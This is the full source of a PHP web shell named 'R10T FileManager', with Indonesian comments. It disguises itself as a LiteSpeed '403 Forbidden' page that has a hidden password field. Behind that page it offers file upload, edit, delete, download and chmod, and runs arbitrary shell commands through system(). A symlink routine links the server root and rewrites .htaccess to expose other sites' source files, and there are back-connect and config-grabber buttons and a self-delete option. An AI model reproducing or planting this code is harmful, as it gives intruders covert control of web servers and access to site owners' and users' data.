<?php
error_reporting(0);

$password = "password";
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set("Asia/Jakarta");

function login()
{
    ?>
    
    <html style="height:100%"><head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title> 403 Forbidden
</title></head>
           </div>
          </form>
            <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
                <div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
                    <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
                    <h2 style="margin-top:20px;font-size: 30px;">Forbidden
                    </h2>
                    <p>Access to this resource on the server is denied!</p>
                    <form action="" method="post">
                    <input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="pass">
                    </div></div><div style="color:#fff; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
                    <br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p>
                    
                    </div>
        </body>
</html>
    
    
    

    <?php
    exit;
}


if (isset($_COOKIE['login']) && $_COOKIE['login'] == md5($password)) {
} elseif (isset($_POST['pass']) && $_POST['pass'] == $password) {
    setcookie('login', md5($password), time() + (86400 * 30), "/"); // Cookie expires in 30 days
} else {
    login();
}

# FILEMANAGER FUNCTIONS #

$base_dir = __DIR__;
$current_dir = realpath(isset($_GET['dir']) ? $_GET['dir'] : $base_dir);

function deleteFile($file) {
    if (file_exists($file) && is_file($file)) {
        unlink($file);
        return true;
    }
    return false;
}

function deleteDirectory($dir) {
    if (is_dir($dir)) {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            if (is_link($path)) {
                // Jika ini adalah symlink, hapus symlink
                unlink($path);
            } elseif (is_dir($path)) {
                // Jika ini adalah folder, panggil fungsi rekursif
                deleteDirectory($path);
            } else {
                // Jika ini adalah file, hapus file
                unlink($path);
            }
        }
        return rmdir($dir);
    } elseif (is_link($dir)) {
        // Jika $dir adalah symlink, hapus symlink
        return unlink($dir);
    }
    return false;
}


function uploadFile($upload_dir) {
    if (isset($_FILES['file'])) {
        $upload_file = $upload_dir . '/' . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
            return true;
        } else {
            echo "Upload failed. Please check your upload directory permissions.";
        }
    }
    return false;
}
function getDirectoriesAndFiles($dir) {
    if (is_dir($dir)) {
        $items = array_diff(scandir($dir), array('.', '..'));
        $result = [];
        foreach ($items as $item) {
            $item_path = $dir . '/' . $item;
            if (is_readable($item_path)) {
                $item_info = [
                    'name' => $item,
                    'path' => $item_path,
                    'is_dir' => is_dir($item_path),
                    'date' => date("Y-m-d H:i:s", filemtime($item_path)),
                    'permissions' => substr(sprintf('%o', fileperms($item_path)), -4),
                ];
                $result[] = $item_info;
            }
        }
        return $result;
    }
    return [];
}

function zipItem($source) {
    $zipFileName = basename($source) . '.zip';

    // Create a ZipArchive object
    $zip = new ZipArchive();
    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
        // Add files or folders to the zip
        if (is_dir($source)) {
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

            foreach ($files as $file) {
                $file = realpath($file);
                if (is_dir($file)) {
                    $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                } elseif (is_file($file)) {
                    $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                }
            }
        } elseif (is_file($source)) {
            $zip->addFile($source, basename($source));
        }

        // Close the zip archive
        $zip->close();

        // Set headers to download the zip file
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipFileName . '"');
        header('Content-Length: ' . filesize($zipFileName));

        // Read the zip file and send it to the output
        readfile($zipFileName);

        // Delete the zip file after sending
        unlink($zipFileName);
    } else {
        echo "Failed to create zip file.";
    }
}

function getLogicalDrives() {
    $drives = [];
    foreach (range('A', 'Z') as $driveLetter) {
        $drive = $driveLetter . ':\\';
        if (is_dir($drive)) {
            $drives[] = $drive;
        }
    }
    return $drives;
}

$availableDrives = getLogicalDrives();

if (isset($_POST['create_item'])) {
    $new_item_name = $_POST['new_item_name'];
    $item_type = $_POST['item_type'];

    $new_item_path = $current_dir . '/' . $new_item_name;

    if ($item_type === 'file') {
        // Check if the file already exists
        if (!file_exists($new_item_path)) {
            // Create an empty file
            if (touch($new_item_path)) {
                echo "File '$new_item_name' created successfully.";
            } else {
                echo "Failed to create file '$new_item_name'.";
            }
        } else {
            echo "File '$new_item_name' already exists.";
        }
    } elseif ($item_type === 'folder') {
        // Check if the folder already exists
        if (!file_exists($new_item_path)) {
            // Create a new folder
            if (mkdir($new_item_path)) {
                echo "Folder '$new_item_name' created successfully.";
            } else {
                echo "Failed to create folder '$new_item_name'.";
            }
        } else {
            echo "Folder '$new_item_name' already exists.";
        }
    } else {
        echo "Invalid item type.";
    }
}

if (isset($_GET['zip'])) {
    $item_to_zip = $_GET['zip'];
    $item_path = $current_dir . '/' . $item_to_zip;

    if (file_exists($item_path)) {
        // Call the function to compress the folder or file
        zipItem($item_path);
    } else {
        echo "File or folder not found.";
    }
}

if (isset($_GET['delete'])) {
    $item_to_delete = $_GET['delete'];
    $item_path = $current_dir . '/' . $item_to_delete;
    if (is_file($item_path)) {
        deleteFile($item_path);
    } elseif (is_dir($item_path)) {
        deleteDirectory($item_path);
    }
}

if (isset($_POST['upload'])) {
    uploadFile($current_dir);
}

if (isset($_POST['change_dir'])) {
    $new_dir = $_POST['new_dir'];
    $new_dir_path = $current_dir . '/' . $new_dir;
    if (is_dir($new_dir_path)) {
        $current_dir = $new_dir_path;
    }
}

if (isset($_GET['download'])) {
    $file_to_download = $_GET['download'];
    $file_path = $current_dir . '/' . $file_to_download;

    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $file_to_download . '"');
        header('Content-Length: ' . filesize($file_path));

        readfile($file_path);
        exit;
    } else {
        echo "File not found.";
    }
}

if (isset($_GET['edit'])) {
    $file_to_edit = $_GET['edit'];
    $file_path = $current_dir . '/' . $file_to_edit;

    if (file_exists($file_path) && is_file($file_path)) {
        // Read the content of the file to be edited
        $file_content = file_get_contents($file_path);

        // Display the edit form
        $editor_display = true; // Add this variable to control the editor display
    } else {
        echo "File not found.";
    }
}

if (isset($_POST['save'])) {
    $file_to_edit = $_POST['edit_file'];
    $file_path = $current_dir . '/' . $file_to_edit;
    $new_content = $_POST['file_content'];

    if (file_exists($file_path) && is_file($file_path)) {
        // Save the changes to the file content
        file_put_contents($file_path, $new_content);
        echo "File saved successfully.";
    } else {
        showAlert('File not found.');
    }
}

if (isset($_GET['chmod'])) {
    $file_to_chmod = $_GET['chmod'];
    $file_path = $current_dir . '/' . $file_to_chmod;

    if (file_exists($file_path)) {
        // Display the chmod form
        $chmod_display = true; // Add this variable to control the chmod form display
    } else {
        echo "File not found.";
    }
}

if (isset($_POST['apply_chmod'])) {
    $chmod_file = $_POST['chmod_file'];
    $new_chmod = $_POST['chmod_input'];

    $file_path = $current_dir . '/' . $chmod_file;

    if (file_exists($file_path)) {
        if (chmod($file_path, octdec($new_chmod))) {
            echo "File permission for '$chmod_file' changed to $new_chmod successfully.";
        } else {
            echo "Failed to change permission for '$chmod_file'.";
        }
    } else {
        echo "File not found.";
    }
}

$items = getDirectoriesAndFiles($current_dir);

if (isset($_GET['logout']) && $_GET['logout'] === 'true') {
    // Clear the login cookie to log the user out
    setcookie('login', '', time() - 3600, "/");
    // Redirect to the home page or wherever you want to go after logout
    header("Location: ?dir=");
    exit;
}

if (isset($_GET['symlin']) && $_GET['symlin'] === 'true') {
    // Mendapatkan root direktori dari server (root disk)
    $root_dir = '/';
    
    // Mendapatkan path ke direktori yang berisi script PHP ini
    $current_dir = dirname(__FILE__);
    
    // Menyusun path lengkap untuk target (root disk)
    $target = realpath($root_dir);
    
    // Pastikan $target adalah direktori yang valid sebelum membuat symlink
    if (is_dir($target)) {
        // Buat folder "sym"
        $sym_folder = 'sym';
        if (!file_exists($sym_folder)) {
            mkdir($sym_folder);
        }

        // Buat symlink ke folder "sym/symbolic_link"
        $link = $sym_folder . '/symbolic_link';
        symlink($target, $link);
        
        // Buat isi .htaccess
        $htaccess_content = <<<EOD
	# Coded By DO NOT OPEN THE DOOR
	Options Indexes FollowSymLinks
	DirectoryIndex solevisible.phtm
	AddType text/plain php html php4 phtml
	AddHandler text/plain php html php4 phtml
	Options all
	EOD;

        // Simpan isi .htaccess ke dalam file
        $htaccess_filename = $sym_folder . '/.htaccess';
        file_put_contents($htaccess_filename, $htaccess_content);
        
        echo "<center>Folder 'sym' dengan symlink dan file '.htaccess' telah berhasil dibuat.</center>";
    } else {
        echo "Direktori root disk tidak valid.";
    }
}

if (isset($_GET['symwin']) && $_GET['symwin'] === 'true') {
    // Mendapatkan path ke direktori yang berisi script PHP ini
    $current_dir = dirname(__FILE__);
    
    // Mendapatkan root direktori dari server (root disk)
    $root_dir = str_replace('/', '\\', $_SERVER['DOCUMENT_ROOT']);
    
    // Menyusun path lengkap untuk target (root disk)
    $target = $root_dir;
    
    // Pastikan $target adalah direktori yang valid sebelum membuat symlink
    if (is_dir($target)) {
        // Buat folder "sym"
        $sym_folder = 'sym';
        if (!file_exists($sym_folder)) {
            mkdir($sym_folder);
        }

        // Buat symlink ke folder "sym/symbolic_link" menggunakan junction point
        $link = $sym_folder . '\\symbolic_link';
        exec("mklink /J $link $target");
        
        // Buat isi .htaccess
        $htaccess_content = <<<EOD
	# Coded By DO NOT OPEN THE DOOR
	Options Indexes FollowSymLinks
	DirectoryIndex solevisible.phtm
	AddType text/plain php html php4 phtml
	AddHandler text/plain php html php4 phtml
	Options all
	EOD;

        // Simpan isi .htaccess ke dalam file
        $htaccess_filename = $sym_folder . '\\.htaccess';
        file_put_contents($htaccess_filename, $htaccess_content);
        
        echo "Folder 'sym' dengan junction point (symlink) dan file '.htaccess' telah berhasil dibuat.";
    } else {
        echo "Direktori root disk tidak valid.";
    }
}

if (isset($_GET['delete']) && $_GET['delete'] === 'true') {
    // Mendapatkan path ke direktori yang berisi script PHP ini
    $current_dir = dirname(__FILE__);
    
    // Mendapatkan nama file script PHP ini
    $script_filename = basename(__FILE__);
    
    // Membuat path lengkap ke file PHP ini
    $script_path = $current_dir . '/' . $script_filename;

    // Cek apakah file PHP ini sama dengan file yang sedang dieksekusi
    if ($script_path === $_SERVER['SCRIPT_FILENAME']) {
        // Hapus script PHP ini
        if (unlink($script_path)) {
            echo "Script PHP ini berhasil dihapus.";
            exit; // Berhenti setelah menghapus script
        } else {
            echo "Gagal menghapus script PHP ini.";
        }
    } else {
        echo "Permintaan tidak valid.";
    }
}

if (isset($_GET['backconnet']) && $_GET['backconnet'] === 'true')

?>

<!DOCTYPE html>
<html lang="en">
<head>
<center>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>R10T FileManager</title>
    <style>
       body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #eeb50c;
        }

        .container {
            margin: 20px;
        }

        .header {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .separator {
            border-top: 1px solid #000;
            margin-top: 10px;
            padding-top: 10px;
        }

        .button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #FF6000;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 20px;
            transition: background-color 0.3s ease; /* Efek transisi untuk perubahan warna latar belakang */
        }

        .button:hover {
            background-color: #f70000; /* Warna latar belakang berubah saat hover */
        }

        .directory a {
            text-decoration: none;
            color: #007BFF;
            transition: text-decoration 0.3s ease; /* Efek transisi untuk perubahan dekorasi teks */
        }

        .directory a:hover {
            text-decoration: underline; /* Munculkan garis bawah saat hover */
        }

        .table-container {
            margin-top: 20px;
            overflow-x: auto;
            max-width: 100%;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background-color: #8c8c8c;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }

        tr:nth-child(even) {
            background-color: #f2f2f2;
        }

        .actions {
            display: flex;
            gap: 10px;
        }

        .upload-form {
            margin-top: 20px;
        }

        .execute-form {
            margin-top: 20px;
        }

        textarea {
            width: 100%;
            height: 300px;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            R10T FileManager
        </div>
        <div class="separator"></div>
        <div class="create-item">
            <label for="file">Create Item</label>
            <form action="?dir=<?php echo $current_dir; ?>" method="POST">
                <input type="text" name="new_item_name" id="new_item_name" required>
                <select name="item_type" id="item_type">
                    <option value="file">File</option>
                    <option value="folder">Folder</option>
                </select>
                <input type="submit" name="create_item" value="Create" class="button">
            </form>
        </div>
        <div class="separator"></div>
        <div class="home-button">
            <a href="?dir=" class="button">Home</a>
            <a href="?logout=true" class="button">Logout</a>
            <a href="?symlin=true" class="button">Symlink linux</a>
            <a href="?symwin=true" class="button">Symlink windows</a>
            <a href="?backconnect=" class="button">bc</a>
            <a href="?dir=" class="button">config grabber</a>
            <a href="?delete=true" class="button">remove this filemanager</a>
            <a href="?dir=" class="button">auto remove</a>
        </div>
       <div class="separator"></div>
        <div class="drive-list">
            <?php
            foreach ($availableDrives as $drive) {
                $driveLetter = substr($drive, 0, 2); // Mendapatkan huruf drive (misalnya C:)
                echo '<a href="?dir=' . $drive . '">' . $driveLetter . '</a> / ';
            }
        ?>
       </div>
       <div class="directory">
            <?php
            $dir_parts = explode(DIRECTORY_SEPARATOR, $current_dir);
            $current_link = '';
            foreach ($dir_parts as $dir_part) {
                $current_link .= $dir_part;
                echo '<a href="?dir=' . $current_link . '">' . $dir_part . '</a> / ';
                $current_link .= DIRECTORY_SEPARATOR;
            }
            ?>
        </div>
        <div class="container">
        <div class="separator"></div>
        <div class="table-container">
            <table>
                <tr>
                    <th>Name</th>
                    <th>Date</th>
                    <th>Permissions</th>
                    <th>Action</th>
                </tr>
                <?php foreach ($items as $item) : ?>
                    <tr>
                        <td>
                            <?php
                            if ($item['is_dir']) {
                                echo '<a href="?dir=' . $item['path'] . '">' . $item['name'] . '</a>';
                            } else {
                                echo $item['name'];
                            }
                            ?>
                        </td>
                        <td class="permissions"><?php echo $item['date']; ?></td>
                        <td class="permissions"><?php echo $item['permissions']; ?></td>                        
                        <td>
                            <?php if ($item['is_dir']) : ?>
                                <a href="?dir=<?php echo $current_dir . '&delete=' . $item['name']; ?>" class="button">Delete</a>
                                <a href="?dir=<?php echo $current_dir . '&zip=' . $item['name']; ?>" class="button">Zip</a>
                                <a href="?dir=<?php echo $current_dir . '&chmod=' . $item['name']; ?>" class="button">chmod</a>
                            <?php else : ?>
                                <div class="actions">
                                    <a href="?dir=<?php echo $current_dir . '&delete=' . $item['name']; ?>" class="button">Delete</a>
                                    <a href="?dir=<?php echo $current_dir . '&download=' . $item['name']; ?>" class="button">Download</a>
                                    <a href="?dir=<?php echo $current_dir . '&zip=' . $item['name']; ?>" class="button">Zip</a>
                                    <a href="?dir=<?php echo $current_dir . '&edit=' . $item['name']; ?>" class="button">Edit</a>
                                    <a href="?dir=<?php echo $current_dir . '&chmod=' . $item['name']; ?>" class="button">chmod</a>
                                </div>
                            <?php endif; ?>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </table>
        </div>
        <?php if (isset($editor_display) && $editor_display === true) : ?>
            <div class="editor">
                <h2>Edit File: <?php echo $file_to_edit; ?></h2>
                <form action="?dir=<?php echo $current_dir; ?>" method="POST">
                    <input type="hidden" name="edit_file" value="<?php echo $file_to_edit; ?>">
                    <textarea name="file_content" rows="10" cols="50"><?php echo htmlspecialchars($file_content); ?></textarea><br>
                    <br>
                    <input type="submit" name="save" value="Save" class="button">
                    <a href="?dir=<?php echo $current_dir; ?>" class="button">Cancel</a>
                </form>
            </div>
        <?php endif; ?>
        <?php if (isset($chmod_display) && $chmod_display === true) : ?>
            <div class="chmod">
                <h1>chmod: <?php echo $file_to_chmod; ?></h1>
                <form action="?dir=<?php echo $current_dir; ?>" method="POST">
                    <input type="hidden" name="chmod_file" value="<?php echo $file_to_chmod; ?>">
                    <label for="chmod_input">new chmod (e.g., 644):</label>
                    <input type="text" name="chmod_input" id="chmod_input" value="<?php echo substr(sprintf('%o', fileperms($file_path)), -4); ?>">
                    <input type="submit" name="apply_chmod" value="Apply" class="button">
                    <a href="?dir=<?php echo $current_dir; ?>" class="button">Cancel</a>
                </form>
            </div>
        <?php endif; ?>
        <div class="separator"></div>
        <div class="upload-form">
            <form enctype="multipart/form-data" action="?dir=<?php echo $current_dir; ?>" method="POST">
                <label for="file">Upload File:</label>
                <input type="file" name="file" id="file">
                <input type="submit" name="upload" value="Upload" class="button">
            </form>
        </div>
        <div class="separator"></div>
        <div class="execute-form">
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                <label for="cmd">Command:</label>
                <input type="text" name="cmd" autofocus id="cmd" size="80">
                <input type="submit" value="Run" class="button">
            </form>
            <pre>
                <?php
                if (isset($_GET['cmd'])) {
                    $cmd = $_GET['cmd'];
                    echo "<pre>";
                    system($cmd);
                    echo "</pre>";
                }
                ?>
            </pre>
        </div>
        <div class="footer">
            &copy; 2023 R10T FileManager
        </div>
    </div>
</center>
</body>
</html>
